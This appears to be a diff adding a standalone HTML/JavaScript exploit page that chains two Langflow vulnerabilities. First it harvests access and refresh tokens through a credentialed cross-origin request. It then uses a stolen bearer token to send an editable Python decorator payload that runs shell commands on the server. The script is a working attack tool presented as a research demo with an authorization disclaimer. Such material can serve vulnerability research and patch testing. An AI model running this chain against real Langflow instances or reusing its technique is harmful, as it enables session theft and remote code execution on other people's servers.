@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Langflow Exploit Chain — CVE-2025-34291 → CVE-2025-3248</title>
+  <style>
+    /*
+     * Langflow Exploit Chain — Research Demo
+     * CVE-2025-34291 (CORS token harvest) → CVE-2025-3248 (authenticated RCE)
+     *
+     * Authorized security research tool. Only use on systems you own
+     * or have explicit written permission to test.
+     */
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #0a0e14;
+      color: #b3d9b3;
+      font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+      padding: 2rem;
+      max-width: 1100px;
+      margin: 0 auto;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    h1 {
+      color: #7bb87b;
+      font-weight: 600;
+      font-size: 1.3rem;
+      letter-spacing: -0.3px;
+      margin-bottom: 0.25rem;
+    }
+
+    .subtitle {
+      color: #556b55;
+      font-size: 0.8rem;
+      margin-bottom: 1.5rem;
+    }
+
+    /* --- Target row --- */
+    .target-row {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      margin-bottom: 1.5rem;
+      flex-wrap: wrap;
+    }
+
+    .target-row label {
+      color: #7a9a7a;
+      font-size: 0.8rem;
+    }
+
+    .target-row input {
+      flex: 1;
+      min-width: 240px;
+      background: #0f141a;
+      border: 1px solid #1f2a2f;
+      color: #b3d9b3;
+      padding: 0.5rem 0.75rem;
+      font-family: inherit;
+      font-size: 0.85rem;
+      outline: none;
+      border-radius: 4px;
+    }
+
+    .target-row input:focus {
+      border-color: #3b7a3b;
+    }
+
+    /* --- Cards for each step --- */
+    .step {
+      background: #0f141a;
+      border: 1px solid #1a242a;
+      border-radius: 6px;
+      margin-bottom: 1rem;
+      padding: 1rem 1.25rem;
+    }
+
+    .step-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.75rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .step-title {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .step-num {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      border: 2px solid #1f2a2f;
+      font-size: 0.7rem;
+      font-weight: 700;
+      color: #556b55;
+      flex-shrink: 0;
+    }
+
+    .step-num.done {
+      border-color: #4caf50;
+      background: #1a3a1a;
+      color: #4caf50;
+    }
+
+    .step-num.fail {
+      border-color: #d44;
+      background: #3a1a1a;
+      color: #d44;
+    }
+
+    .step h3 {
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: #c5e0c5;
+    }
+
+    .step-desc {
+      font-size: 0.75rem;
+      color: #556b55;
+      margin-bottom: 0.75rem;
+    }
+
+    /* --- Buttons --- */
+    button {
+      background: #121a20;
+      border: 1px solid #1f2a2f;
+      color: #b3d9b3;
+      padding: 0.5rem 1.2rem;
+      font-family: inherit;
+      font-size: 0.8rem;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+
+    button:hover:not(:disabled) {
+      background: #1a2a30;
+      border-color: #3b7a3b;
+      color: #d4f0d4;
+    }
+
+    button:disabled {
+      opacity: 0.35;
+      cursor: not-allowed;
+    }
+
+    button.primary {
+      border-color: #3b7a3b;
+      background: #142a1a;
+    }
+
+    button.primary:hover:not(:disabled) {
+      background: #1c3a24;
+    }
+
+    button.danger {
+      border-color: #a33;
+      color: #d88;
+    }
+
+    button.danger:hover:not(:disabled) {
+      background: #2a1a1a;
+      border-color: #d44;
+    }
+
+    .btn-group {
+      display: flex;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+
+    /* --- Payload textarea --- */
+    textarea {
+      width: 100%;
+      min-height: 80px;
+      background: #0a0e14;
+      border: 1px solid #1f2a2f;
+      color: #7bb87b;
+      font-family: inherit;
+      font-size: 0.8rem;
+      padding: 0.6rem;
+      border-radius: 4px;
+      resize: vertical;
+      outline: none;
+      margin-top: 0.5rem;
+      tab-size: 4;
+      line-height: 1.5;
+    }
+
+    textarea:focus {
+      border-color: #3b7a3b;
+    }
+
+    .payload-label {
+      font-size: 0.75rem;
+      color: #556b55;
+      display: block;
+      margin-top: 0.5rem;
+    }
+
+    /* --- Status badge inline --- */
+    .status-badge {
+      font-size: 0.7rem;
+      padding: 0.15rem 0.5rem;
+      border-radius: 3px;
+      background: #121a20;
+      border: 1px solid #1f2a2f;
+      color: #556b55;
+    }
+
+    .status-badge.success {
+      background: #1a3a1a;
+      border-color: #4caf50;
+      color: #7bb87b;
+    }
+
+    .status-badge.fail {
+      background: #3a1a1a;
+      border-color: #d44;
+      color: #d88;
+    }
+
+    .status-badge.running {
+      background: #1a2a1a;
+      border-color: #eab308;
+      color: #eab308;
+    }
+
+    /* --- Collapsible JWT --- */
+    .jwt-box {
+      display: none;
+      margin-top: 0.6rem;
+      border: 1px solid #1a242a;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .jwt-box.open { display: block; }
+
+    .jwt-header {
+      display: flex;
+      justify-content: space-between;
+      padding: 0.4rem 0.75rem;
+      background: #0a0e14;
+      cursor: pointer;
+      font-size: 0.75rem;
+      color: #556b55;
+      user-select: none;
+    }
+
+    .jwt-header:hover { color: #7a9a7a; }
+
+    .jwt-body {
+      padding: 0.75rem;
+      background: #080b10;
+      font-size: 0.7rem;
+      color: #7a9a7a;
+      word-break: break-all;
+      white-space: pre-wrap;
+      line-height: 1.5;
+      max-height: 400px;
+      overflow-y: auto;
+    }
+
+    /* --- Output terminal --- */
+    .terminal {
+      background: #080b10;
+      border: 1px solid #1a242a;
+      border-radius: 6px;
+      padding: 1rem;
+      min-height: 200px;
+      max-height: 500px;
+      overflow-y: auto;
+      font-size: 0.8rem;
+      color: #7bb87b;
+      line-height: 1.65;
+      white-space: pre-wrap;
+      word-break: break-word;
+      margin-top: 0.5rem;
+    }
+
+    .terminal .ts { color: #3a5a3a; font-size: 0.65rem; }
+    .terminal .req { color: #5b8fc7; font-weight: 600; }
+    .terminal .res { color: #7bb87b; font-weight: 600; }
+    .terminal .err { color: #d44; font-weight: 600; }
+    .terminal .info { color: #c5b355; font-weight: 600; }
+    .terminal .divider { color: #1a242a; }
+    .terminal .empty { color: #3a4a3a; font-style: italic; }
+
+    .terminal::-webkit-scrollbar { width: 5px; }
+    .terminal::-webkit-scrollbar-track { background: #080b10; }
+    .terminal::-webkit-scrollbar-thumb { background: #1a242a; border-radius: 3px; }
+
+    /* --- Progress row --- */
+    .progress-row {
+      display: flex;
+      gap: 1.5rem;
+      margin: 0.75rem 0 0;
+      font-size: 0.75rem;
+      color: #3a5a3a;
+      flex-wrap: wrap;
+    }
+
+    .progress-row .check { color: #4caf50; }
+    .progress-row .cross { color: #d44; }
+    .progress-row .pending { color: #556b55; }
+
+    /* --- Separator --- */
+    hr {
+      border: none;
+      border-top: 1px solid #1a242a;
+      margin: 1.5rem 0 0.75rem 0;
+    }
+
+    /* responsive */
+    @media (max-width: 600px) {
+      body { padding: 1rem; }
+      .step-header { flex-direction: column; align-items: flex-start; }
+    }
+  </style>
+</head>
+<body>
+
+<h1>Langflow Exploit Chain</h1>
+<div class="subtitle">CVE-2025-34291 (token harvest) → CVE-2025-3248 (authenticated RCE) · Research Demo</div>
+
+<!-- Target -->
+<div class="target-row">
+  <label for="target">Target</label>
+  <input type="text" id="target" value="http://localhost:7860" spellcheck="false" />
+</div>
+
+<!-- ===== Step 1 ===== -->
+<div class="step" id="step1">
+  <div class="step-header">
+    <span class="step-title">
+      <span class="step-num" id="step1-num">1</span>
+      <h3>Request Fresh Tokens</h3>
+      <span class="status-badge" id="step1-badge">Not Started</span>
+    </span>
+    <button class="primary" id="btn-step1">Send POST /api/v1/refresh</button>
+  </div>
+  <div class="step-desc">
+    Credentialed cross-origin POST to <code>/api/v1/refresh</code>.
+    Exploits permissive CORS + <code>SameSite=None</code> cookie.
+    Response contains <code>access_token</code> and <code>refresh_token</code>.
+  </div>
+  <!-- JWT display (hidden until harvested) -->
+  <div class="jwt-box" id="jwt-box">
+    <div class="jwt-header" id="jwt-toggle">
+      <span>JWT Access Token</span>
+      <span id="jwt-arrow">▼</span>
+    </div>
+    <div class="jwt-body" id="jwt-body"></div>
+  </div>
+</div>
+
+<!-- ===== Step 2 ===== -->
+<div class="step" id="step2">
+  <div class="step-header">
+    <span class="step-title">
+      <span class="step-num" id="step2-num">2</span>
+      <h3>Trigger RCE</h3>
+      <span class="status-badge" id="step2-badge">Pending</span>
+    </span>
+    <button class="primary" id="btn-step2" disabled>Send POST /api/v1/validate/code</button>
+  </div>
+  <div class="step-desc">
+    Uses harvested <code>access_token</code> as <code>Authorization: Bearer</code>.
+    Sends a Python decorator payload that gets <code>exec()</code>'d server-side.
+    Edit the payload below if desired.
+  </div>
+  <label class="payload-label">Python payload (decorator technique):</label>
+  <textarea id="payload" spellcheck="false">@exec("raise Exception(__import__('subprocess').check_output(['id']))")
+def foo():
+  pass</textarea>
+</div>
+
+<!-- ===== Step 3 ===== -->
+<div class="step" id="step3">
+  <div class="step-header">
+    <span class="step-title">
+      <span class="step-num" id="step3-num">↻</span>
+      <h3>Clear State</h3>
+      <span class="status-badge" id="step3-badge">—</span>
+    </span>
+    <button class="danger" id="btn-step3">Reset</button>
+  </div>
+  <div class="step-desc">
+    Clears stored tokens, terminal output, and resets all indicators.
+  </div>
+</div>
+
+<hr />
+
+<!-- Progress summary -->
+<div class="progress-row">
+  <span id="progress-step1">○ Step 1: Not Started</span>
+  <span id="progress-step2">○ Step 2: Pending</span>
+</div>
+
+<!-- Terminal output -->
+<div style="font-size:0.75rem;color:#556b55;margin-top:0.5rem;">▼ Request / Response Log</div>
+<div class="terminal" id="terminal"><span class="empty">Waiting for action…</span></div>
+
+<script>
+(function () {
+  'use strict';
+
+  /* ---- DOM refs ---- */
+  const $ = id => document.getElementById(id);
+  const targetInput  = $('target');
+  const btnStep1     = $('btn-step1');
+  const btnStep2     = $('btn-step2');
+  const btnStep3     = $('btn-step3');
+  const terminal     = $('terminal');
+  const payload      = $('payload');
+
+  const step1Num   = $('step1-num');
+  const step2Num   = $('step2-num');
+  const step3Num   = $('step3-num');
+  const step1Badge = $('step1-badge');
+  const step2Badge = $('step2-badge');
+  const step3Badge = $('step3-badge');
+  const prog1      = $('progress-step1');
+  const prog2      = $('progress-step2');
+
+  const jwtBox   = $('jwt-box');
+  const jwtBody  = $('jwt-body');
+  const jwtToggle = $('jwt-toggle');
+  const jwtArrow  = $('jwt-arrow');
+
+  /* ---- State ---- */
+  let state = {
+    accessToken:  null,
+    refreshToken: null,
+    step1Done:    false,
+    step2Done:    false
+  };
+
+  /* ---- Logging ---- */
+  function log(type, msg) {
+    const ts = new Date().toLocaleTimeString('en-US', { hour12: false });
+    const empty = terminal.querySelector('.empty');
+    if (empty) empty.remove();
+
+    const line = document.createElement('div');
+    const tsSpan = document.createElement('span');
+    tsSpan.className = 'ts';
+    tsSpan.textContent = `[${ts}] `;
+    line.appendChild(tsSpan);
+
+    const label = document.createElement('span');
+    label.className = type;
+    const labels = { req: '▶ REQ  ', res: '◀ RES  ', err: '✖ ERR  ', info: '● INFO ' };
+    label.textContent = labels[type] || '● ';
+    line.appendChild(label);
+
+    const msgSpan = document.createElement('span');
+    msgSpan.textContent = msg;
+    line.appendChild(msgSpan);
+
+    terminal.appendChild(line);
+    terminal.scrollTop = terminal.scrollHeight;
+  }
+
+  function logDivider() {
+    const d = document.createElement('div');
+    d.className = 'divider';
+    d.textContent = '─'.repeat(55);
+    terminal.appendChild(d);
+    terminal.scrollTop = terminal.scrollHeight;
+  }
+
+  /* ---- Status helpers ---- */
+  function setStepStatus(step, status) {
+    const num  = step === 1 ? step1Num  : (step === 2 ? step2Num  : step3Num);
+    const badge= step === 1 ? step1Badge: (step === 2 ? step2Badge: step3Badge);
+
+    num.className = 'step-num';
+    if (status === 'done') {
+      num.classList.add('done');
+      num.textContent = '✓';
+      badge.textContent = 'Success';
+      badge.className = 'status-badge success';
+    } else if (status === 'fail') {
+      num.classList.add('fail');
+      num.textContent = '✗';
+      badge.textContent = 'Failed';
+      badge.className = 'status-badge fail';
+    } else if (status === 'running') {
+      badge.textContent = 'Running…';
+      badge.className = 'status-badge running';
+      num.textContent = step === 3 ? '↻' : String(step);
+    } else {
+      // idle
+      num.textContent = step === 3 ? '↻' : String(step);
+      badge.textContent = step === 1 ? 'Not Started' : (step === 2 ? 'Pending' : '—');
+      badge.className = 'status-badge';
+    }
+
+    // Progress line
+    const progEl = step === 1 ? prog1 : prog2;
+    if (status === 'done')      progEl.innerHTML = `<span class="check">✓</span> Step ${step}: Complete`;
+    else if (status === 'fail') progEl.innerHTML = `<span class="cross">✗</span> Step ${step}: Failed`;
+    else if (status === 'running') progEl.innerHTML = `○ Step ${step}: Running…`;
+    else                         progEl.innerHTML = `○ Step ${step}: ${step === 1 ? 'Not Started' : 'Pending'}`;
+  }
+
+  /* ---- JWT display ---- */
+  function showJwt(token) {
+    const payload = (() => {
+      try {
+        const parts = token.split('.');
+        if (parts.length !== 3) return null;
+        const b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
+        return JSON.parse(atob(b64));
+      } catch (_) { return null; }
+    })();
+
+    let text = `access_token (JWT)\n${'─'.repeat(45)}\n`;
+    if (payload) {
+      text += `Header:    ${token.split('.')[0]}\n`;
+      text += `Payload:   ${JSON.stringify(payload, null, 2)}\n`;
+      text += `Signature: ${token.split('.')[2].substring(0, 16)}…\n`;
+    }
+    text += `${'─'.repeat(45)}\n${token}`;
+
+    jwtBody.textContent = text;
+    jwtBox.classList.add('open');
+    jwtArrow.textContent = '▼';
+  }
+
+  function hideJwt() {
+    jwtBox.classList.remove('open');
+  }
+
+  function truncate(tok) {
+    if (!tok || tok.length < 30) return tok || '(none)';
+    return tok.substring(0, 16) + '…' + tok.substring(tok.length - 4);
+  }
+
+  /* ---- Reset ---- */
+  function resetAll() {
+    state = { accessToken: null, refreshToken: null, step1Done: false, step2Done: false };
+    btnStep2.disabled = true;
+    hideJwt();
+    terminal.innerHTML = '<span class="empty">Waiting for action…</span>';
+    setStepStatus(1, 'idle');
+    setStepStatus(2, 'idle');
+    setStepStatus(3, 'idle');
+    step3Num.textContent = '↻';
+    step3Num.className = 'step-num';
+    step3Badge.textContent = '—';
+    step3Badge.className = 'status-badge';
+    log('info', 'State cleared. Ready.');
+  }
+
+  /* ---- Step 1 ---- */
+  async function step1_refresh() {
+    const base = targetInput.value.trim().replace(/\/+$/, '');
+    const url  = base + '/api/v1/refresh';
+
+    btnStep1.disabled = true;
+    setStepStatus(1, 'running');
+    logDivider();
+    log('info', `Step 1 — Token Harvest`);
+    log('req', `POST ${url}`);
+    log('req', `Headers: {"Content-Type":"application/json"}`);
+    log('req', `Credentials: include (cookie)`);
+
+    try {
+      const resp = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include'
+      });
+
+      const respHeaders = {};
+      resp.headers.forEach((v, k) => { respHeaders[k] = v; });
+
+      let body;
+      const ct = resp.headers.get('content-type') || '';
+      body = ct.includes('json') ? await resp.json() : { raw: await resp.text() };
+
+      log('res', `Status: ${resp.status} ${resp.statusText}`);
+      log('res', `Headers: ${JSON.stringify(respHeaders)}`);
+      log('res', `Body: ${JSON.stringify(body, null, 2)}`);
+
+      if (!resp.ok) {
+        throw new Error(`HTTP ${resp.status}: ${JSON.stringify(body)}`);
+      }
+
+      const at = body.access_token;
+      const rt = body.refresh_token;
+      if (!at) throw new Error('No access_token in response');
+
+      state.accessToken  = at;
+      state.refreshToken = rt || null;
+      state.step1Done    = true;
+
+      showJwt(at);
+      log('info', `✔ access_token: ${truncate(at)}`);
+      if (rt) log('info', `✔ refresh_token: ${truncate(rt)}`);
+      log('info', `Step 1 complete.`);
+
+      setStepStatus(1, 'done');
+      btnStep2.disabled = false;
+
+    } catch (err) {
+      log('err', `Failed: ${err.message}`);
+      setStepStatus(1, 'fail');
+    } finally {
+      btnStep1.disabled = false;
+    }
+  }
+
+  /* ---- Step 2 ---- */
+  async function step2_rce() {
+    if (!state.accessToken) {
+      log('err', 'No token. Complete Step 1 first.');
+      return;
+    }
+
+    const base = targetInput.value.trim().replace(/\/+$/, '');
+    const url  = base + '/api/v1/validate/code';
+    const code = payload.value;
+
+    btnStep2.disabled = true;
+    setStepStatus(2, 'running');
+    logDivider();
+    log('info', `Step 2 — RCE`);
+    log('req', `POST ${url}`);
+    log('req', `Authorization: Bearer ${truncate(state.accessToken)}`);
+    log('req', `Body: {"code":"${code.substring(0, 80)}…"}`);
+
+    try {
+      const resp = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Authorization': 'Bearer ' + state.accessToken,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ code })
+      });
+
+      const respHeaders = {};
+      resp.headers.forEach((v, k) => { respHeaders[k] = v; });
+
+      let body;
+      const ct = resp.headers.get('content-type') || '';
+      body = ct.includes('json') ? await resp.json() : { raw: await resp.text() };
+
+      log('res', `Status: ${resp.status} ${resp.statusText}`);
+      log('res', `Headers: ${JSON.stringify(respHeaders)}`);
+      log('res', `Body: ${JSON.stringify(body, null, 2)}`);
+
+      // Even on 422/500 the decorator exec() runs before the error
+      log('info', `✔ Payload delivered. Check output above for results.`);
+      setStepStatus(2, 'done');
+      state.step2Done = true;
+
+    } catch (err) {
+      log('err', `Failed: ${err.message}`);
+      setStepStatus(2, 'fail');
+    } finally {
+      btnStep2.disabled = false;
+    }
+  }
+
+  /* ---- Events ---- */
+  btnStep1.addEventListener('click', step1_refresh);
+  btnStep2.addEventListener('click', step2_rce);
+  btnStep3.addEventListener('click', resetAll);
+
+  jwtToggle.addEventListener('click', () => {
+    const isOpen = jwtBox.classList.toggle('open');
+    jwtArrow.textContent = isOpen ? '▼' : '▶';
+  });
+
+  /* ---- Init ---- */
+  resetAll();
+
+  console.log('Langflow Exploit Chain — CVE-2025-34291 → CVE-2025-3248');
+  console.log('Authorized research tool.');
+
+})();
+</script>
+</body>
+</html>
